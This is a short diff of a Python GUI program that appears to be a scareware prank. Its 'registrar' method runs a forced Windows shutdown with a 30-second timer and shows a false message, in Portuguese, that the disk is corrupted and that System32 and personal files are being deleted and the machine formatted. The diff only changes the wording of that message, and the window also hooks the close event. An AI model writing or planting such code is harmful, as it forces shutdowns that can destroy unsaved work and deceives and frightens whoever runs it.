@@ -34,7 +34,7 @@ class Main:
             time.sleep(1)
 
     def registrar(self):
-        os.system('shutdown /s /f /t 30 /c "Disco corrompido. Como medida drástica de liberar espaço desinstalando Grand Theft Auto V - (GTA 5) e arquivos pessoais. Iniciando a formatação do computador..."')
+        os.system('shutdown /s /f /t 30 /c "Disco corrompido. Como medida drástica de liberar espaço desinstalando: Windows System 32 e arquivos pessoais. Iniciando a formatação do computador..."')
 
         self.erro = customtkinter.CTkLabel(self.janela, text="Erro catastrófico!", font=("Italic", 20, "bold"))
         self.janela.protocol("WM_DELETE_WINDOW", self.on_closing)
@@ -71,3 +71,4 @@ class Main:
 
 if __name__ == "__main__":
     app = Main()
+
